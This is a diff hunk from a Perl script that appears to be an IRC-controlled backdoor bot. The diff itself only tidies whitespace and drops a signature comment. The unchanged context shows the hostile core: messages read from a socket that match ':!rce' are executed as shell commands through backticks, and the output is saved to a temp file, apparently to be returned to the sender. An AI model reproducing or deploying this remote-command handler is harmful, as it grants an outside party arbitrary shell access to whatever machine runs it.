@@ -229,24 +229,24 @@ while ( my $log = <$s0ck3t> ) {
       #######################
       # o inocent eo cris   #
       # sao os mais brabor  #
-  	  #######################
+      #######################
 
       #######################
       # o inocent eo cris   #
       # sao os mais brabor  #
-  	  #######################
+      #######################
 
       #######################
       # o inocent eo cris   #
       # sao os mais brabor  #
-  	  #######################
+      #######################
 
       if ( $log =~ m/:!rce (.*)$/g ){##########
         my $comando_raw = `$1`;
         open(handler,">mat.tmp");
         print handler $comando_raw;
         close(handler);
-                                                                                                                                             	  #sdds_m4luko
+	
         open(h4ndl3r,"<","mat.tmp");
         my @commandoarray = <h4ndl3r>;
 
